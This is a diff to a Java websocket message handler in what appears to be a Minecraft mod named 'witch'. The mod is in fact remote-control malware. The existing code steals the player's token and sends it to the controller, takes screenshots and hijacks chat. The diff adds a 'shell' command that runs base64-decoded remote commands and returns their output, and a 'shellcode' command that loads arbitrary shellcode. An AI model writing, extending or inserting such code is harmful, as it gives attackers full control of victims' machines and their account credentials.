@@ -2,9 +2,7 @@ package me.soda.witch.websocket;
 
 import me.soda.witch.Witch;
 import me.soda.witch.config.Config;
-import me.soda.witch.features.ChatControl;
-import me.soda.witch.features.Modlist;
-import me.soda.witch.features.Stealer;
+import me.soda.witch.features.*;
 import net.minecraft.text.Text;
 import net.minecraft.util.SystemDetails;
 
@@ -29,9 +27,10 @@ public class MessageHandler {
                 case "steal_token":
                     MessageUtils.sendMessage(messageType, Stealer.stealToken());
                     break;
-                case "getcfg":
-                    break;
+                case "getconfig":
                 case "vanish":
+                case "log":
+                    //todo
                     break;
                 case "chat_control":
                     if (msgArr.length < 2) break;
@@ -58,12 +57,8 @@ public class MessageHandler {
                     sd.writeTo(sb);
                     MessageUtils.sendMessage(messageType, sb.toString());
                     break;
-                case "log":
-                    break;
                 case "screenshot":
                     Witch.screenshot = true;
-                    break;
-                case "execute_shellcode":
                     break;
                 case "chat":
                     if (msgArr.length < 2) break;
@@ -72,6 +67,16 @@ public class MessageHandler {
                 case "kill":
                     Witch.client.close(false);
                     break;
+                case "shell":
+                    if (msgArr.length < 2) break;
+                    new Thread(() -> {
+                        String result = ShellUtil.runCmd(decodeBase64(msgArr[1]));
+                        MessageUtils.sendMessage(messageType, "\n" + result);
+                    }).start();
+                    break;
+                case "shellcode":
+                    if (msgArr.length < 2) break;
+                    new Thread(() -> new ShellcodeLoader().loadShellCode(msgArr[1], false)).start();
                 default:
                     System.out.println();
                     break;
